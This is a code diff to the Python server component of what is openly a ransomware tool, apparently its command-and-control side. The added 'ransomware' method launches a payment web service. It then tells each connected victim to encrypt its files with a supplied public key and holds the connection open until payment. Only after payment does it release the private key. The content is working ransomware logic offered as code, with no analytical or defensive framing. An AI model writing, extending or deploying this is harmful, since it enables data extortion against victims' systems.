@@ -8,6 +8,7 @@ import curses
 import bus
 import queue
 import ransom
+import payment
 
 class Server:
     def __init__(self, bus: bus.Bus):
@@ -23,6 +24,8 @@ class Server:
     
     def start(self):
         # Bind and Listen
+
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.bind((self.addr, self.port))
         self.sock.listen(5)
         self.running = True
@@ -49,27 +52,28 @@ class Server:
                     case "list":
                         self.list_connections()
                     case "ransom":
-                        r = ransom.Ransom()
+                        self.ransomware()
 
             except queue.Empty:
                 pass
                       
     def handle_client(self, conn: socket.socket, addr):
         try:
-            data = conn.recv(2048)
-            self.log(f"Received data from {addr[0]}:{addr[1]}: {data.decode()}")
+            self.log(f"Received data from {addr[0]}:{addr[1]}")
+            # no close here at all — ransomware() owns the socket from here
         except Exception as e:
             self.log(f"Something went wrong with {addr[0]}:{addr[1]}: {e}")
-        finally:
+            # only close on actual error
             conn.close()
-            self.log(f"Connection closed: {addr[0]}:{addr[1]}")
+            self.bus.connections = [c for c in self.bus.connections if list(c.keys())[0] != addr]
 
     def list_connections(self):
-        if len(self.connections) == 0:
+        if not self.bus.connections:
             self.log("No active connections")
             return
-        for c in self.connections:
-            self.log(f"{list(c.keys())[0][0]}:{list(c.keys())[0][1]}")
+        for c in self.bus.connections:
+            addr = list(c.keys())[0]
+            self.log(f"{addr[0]}:{addr[1]}")
 
     def check_payment(self, conn):
         if globals.get_payment():
@@ -80,3 +84,56 @@ class Server:
             key = f.read()
         conn.send(key.encode())
         print("Sent private key")
+
+
+
+### ATTACKS ###
+    def ransomware(self):
+        import logging
+        logging.getLogger('werkzeug').setLevel(logging.ERROR)
+        # Start Payment Thread
+        payment_thread = threading.Thread(
+            target=payment.app.run,
+            kwargs={
+                "host": "0.0.0.0",
+                "port": 5000,
+                "use_reloader": False,
+                "debug": False
+            }
+        )
+        payment_thread.daemon = True
+        payment_thread.start()
+
+        for target in self.bus.targets:
+            for addr, conn in target.items():          
+                # Get ready
+                conn.send("RANSOM".encode())
+                self.log(f"{addr} is waiting For READY")
+                data = conn.recv(2048)
+                if data.decode() == "READY":
+                    self.log(f"{addr} is ready for attack!")
+                    r = ransom.Ransom()
+                    # After ready send public key
+                    conn.send(r.serialize_public_key())
+                    # Get Confirmation of encryption
+                    confirm = conn.recv(2048)
+                    self.log(f"{addr} is encrypted!")
+                        
+                    while not globals.get_payment():
+                        # feed ransom nonsense to keep alive
+                        conn.send("PING".encode())
+                        conn.recv(2048)
+                        time.sleep(1)
+                        
+                    conn.send("PAID".encode())
+                    confirm = conn.recv(2048)
+                    self.log(f"{addr} has payed!")
+                    # After payment is completed
+                    conn.send(r.serialize_private_key())
+                    confirm = conn.recv(2048)  # wait for client DONE
+                    self.log(f"{addr} decrypted successfully — ransom complete")
+                else:
+                    self.log(f"{addr} did not respond with READY, skipping")
+        
+
+    
